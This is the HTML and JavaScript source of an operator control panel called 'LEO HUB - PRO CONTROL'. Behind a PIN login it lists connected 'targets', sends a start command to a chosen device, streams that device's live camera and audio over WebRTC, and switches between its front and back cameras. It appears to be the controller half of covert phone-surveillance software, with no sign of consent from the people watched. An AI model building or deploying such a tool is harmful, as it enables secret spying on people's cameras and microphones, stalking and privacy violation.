<!DOCTYPE html>
<html>
<head>
    <title>LEO HUB - PRO CONTROL</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 260px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; }
        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .user-item { background: #112240; padding: 12px; margin: 10px 0; border-radius: 8px; cursor: pointer; border: 1px solid transparent; }
        .user-item.active { border-color: var(--blue); background: #1d335c; }
        .video-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 15px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .controls { margin-top: 20px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: var(--blue); color: var(--dark); }
        #login { position: fixed; inset: 0; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="login">
        <div style="text-align: center;">
            <h2 style="color: var(--blue);">ADMIN AUTHORIZATION</h2>
            <input type="password" id="pin" placeholder="ENTER PIN" style="padding:10px; border-radius:5px; border:1px solid var(--blue); background:#111; color:white;">
            <button onclick="auth()" class="btn" style="margin-top:10px;">LOGIN</button>
        </div>
    </div>
    <div class="sidebar">
        <h3 style="color: var(--blue);">DEVICES</h3>
        <div id="user-list"></div>
    </div>
    <div class="main">
        <div style="font-size:0.8rem; margin-bottom:10px; color:#8892b0;">HUB STATUS: <span id="st" style="color:#00ff00;">READY</span> | DEVICE: <span id="cur">NONE</span></div>
        <div class="video-box">
            <video id="remoteVideo" autoplay playsinline></video>
            <div id="audio-btn" style="position:absolute; top:10px; right:10px; background:red; padding:5px; cursor:pointer; font-size:10px;" onclick="unmute()">UNMUTE AUDIO</div>
        </div>
        <div class="controls">
            <button class="btn" onclick="sendCommand('front')">FRONT CAM</button>
            <button class="btn" onclick="sendCommand('back')">BACK CAM</button>
            <button class="btn" onclick="refreshHub()">REFRESH HUB</button>
            <button class="btn" style="border-color: #ff4444; color: #ff4444;" onclick="location.reload()">SYSTEM RESET</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTarget = null, pc;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function auth() { socket.emit('admin-join', document.getElementById('pin').value); }
        socket.on('admin-status', (r) => { if(r.success) document.getElementById('login').classList.add('hidden'); else alert("WRONG PIN"); });

        socket.on('update-targets', (l) => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            l.forEach(id => {
                const d = document.createElement('div');
                d.className = `user-item ${currentTarget === id ? 'active' : ''}`;
                d.innerText = "Device_" + id.substring(0,5);
                d.onclick = () => select(id);
                list.appendChild(d);
            });
        });
        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-btn').classList.add('hidden'); }
        function refreshHub() { if(currentTarget) select(currentTarget); }

        async function select(id) {
            currentTarget = id; document.getElementById('cur').innerText = id;
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: currentTarget, signal: { candidate: e.candidate } }); };
            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            socket.emit('command', { targetId: currentTarget, cmd: 'start' });
        }

        socket.on('signal', async (d) => {
            if(d.from !== currentTarget) return;
            if(d.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                if(d.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                }
            } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });

        function sendCommand(c) { socket.emit('command', { targetId: currentTarget, cmd: c }); }
    </script>
</body>
</html>
